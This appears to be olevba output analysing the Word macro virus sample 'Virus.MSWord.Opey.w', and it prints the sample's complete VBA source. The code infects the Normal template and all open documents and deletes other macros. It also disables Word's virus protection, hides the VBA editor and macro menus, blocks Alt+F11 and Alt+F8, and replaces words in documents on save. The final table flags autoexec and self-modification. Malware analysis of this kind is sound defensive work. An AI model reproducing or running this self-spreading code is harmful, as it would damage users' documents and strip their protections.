olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey.w
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey.w - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Kinetic.bas 
in file: Virus.MSWord.Opey.w - OLE stream: 'Macros/VBA/Kinetic'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Ang Bayrus na ito ay gawang pilipino
'Ipagmalaki natin! (guapito) p/n: D_NH691
'(c) 1999 by Kinetic Stab of Hackerz Networx
'(www.hnetworx.iscool.net) or (surf.to/hacknet.com)
'Virus Name: TangnalakiU

Sub Ikaw()
  On Error Resume Next
    Call Kinetic
    NTInfected = False
        For i = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
            clan = NormalTemplate.VBProject.VBComponents(i).Name
                If clan = "Kinetic" Then NTInfected = True
                If (clan <> "Kinetic") And (clan <> "ThisDocument") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
        Next i
        For Each opendoc In Documents
            ODInfected = False
            With opendoc
                For j = opendoc.VBProject.VBComponents.Count To 1 Step -1
                clan = opendoc.VBProject.VBComponents(j).Name
                    If clan = "Kinetic" Then ODInfected = True
                    If (clan <> "Kinetic") And (clan <> "ThisDocument") And (clan <> "Reference to Normal") Then Application.OrganizerDelete Source:=opendoc.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
                Next j
                If ODInfected = False Then
                    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=opendoc.FullName, Name:="Kinetic", Object:=wdOrganizerObjectProjectItems
                    opendoc.SaveAs FileName:=opendoc.FullName
                End If
            End With
        Next opendoc
            If NTInfected = False Then
                Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Kinetic", Object:=wdOrganizerObjectProjectItems
                NormalTemplate.Save
            End If
End Sub
Sub Kinetic()
    On Error Resume Next
    Application.UserName = "Kinetic Stab"
    Application.UserAddress = "www.hnetworx.iscool.net"
    Application.UserInitials = "Kinetic"
    With Dialogs(wdDialogFileSummaryInfo)
        .Author = "Kinetic Stab"
        .Title = "This One is for MaIdCr"
        .Subject = "Is it okay if I call you mine?"
        .Company = "Hackerz Networx"
        .Comments = "Tangnalakiu"
        .Execute
    End With
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    On Error Resume Next
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    CommandBars("Tools").Controls("Macro").Enabled = False
    CommandBars("Tools").Controls("Customize...").Delete
    CustomizationContext = NormalTemplate
End Sub
Sub FileSave()
    On Error Resume Next
        Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = "The"
            .Replacement.Text = "Kinetic"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save

    Call Ikaw
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call Ikaw
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub FileExit()
    On Error Resume Next
    Call Ikaw
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub FileNew()
    On Error Resume Next
    Dialogs(wdDialogFileNew).Show
    newfile$ = 1
    Call Ikaw
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call Ikaw
End Sub
Sub AutoExec()
    On Error Resume Next
    If Month(Now) = 9 And Day(Now) = 10 Then MsgBox " The world has awaited what Kinetic has Invaded"
    If Day(Now) = 1 Then Selection.TypeText " Today is 1st day of the month "
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    Call Ikaw
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = "I"
            .Replacement.Text = "Kinetic"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save

    Call Ikaw
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FilePageSetup()
    On Error Resume Next
    Call Ikaw
    Dialogs(wdDialogFilePageSetup).Show
End Sub
Sub FilePrint()
    On Error Resume Next
    Call Ikaw
    Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileOpen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call Ikaw
End Sub
Sub HelpAbout()
    On Error Resume Next
    Dialogs(wdDialogHelpAbout).DisableMsgBox "This virus was created by:" & vbCr & "" & vbCr & " Kinetic Stab   [pinoy ako!]" & vbCr & "www.hnetworx.iscool.net"
    Call Ikaw
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

